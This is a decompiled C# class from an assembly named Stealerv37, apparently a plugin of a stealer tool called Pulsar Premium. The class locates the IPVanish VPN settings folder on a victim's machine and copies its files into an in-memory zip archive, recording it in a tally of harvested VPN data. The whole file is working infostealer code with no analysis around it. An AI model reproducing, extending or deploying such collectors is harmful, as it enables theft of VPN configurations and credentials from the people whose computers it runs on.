// Decompiled with JetBrains decompiler
// Type: Intelix.Targets.Vpn.IpVanish
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using Intelix.Helper.Data;
using System;
using System.IO;

#nullable disable
namespace Intelix.Targets.Vpn;

public class IpVanish : ITarget
{
  public void Collect(InMemoryZip zip, Counter counter)
  {
    string str = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "IPVanish", "Settings");
    if (!Directory.Exists(str))
      return;
    string targetEntryDirectory = "IPVanish";
    Counter.CounterApplications counterApplications = new Counter.CounterApplications();
    counterApplications.Name = "IPVanish";
    zip.AddDirectoryFiles(str, targetEntryDirectory);
    counterApplications.Files.Add($"{str} => {targetEntryDirectory}");
    counterApplications.Files.Add(targetEntryDirectory);
    counter.Vpns.Add(counterApplications);
  }
}
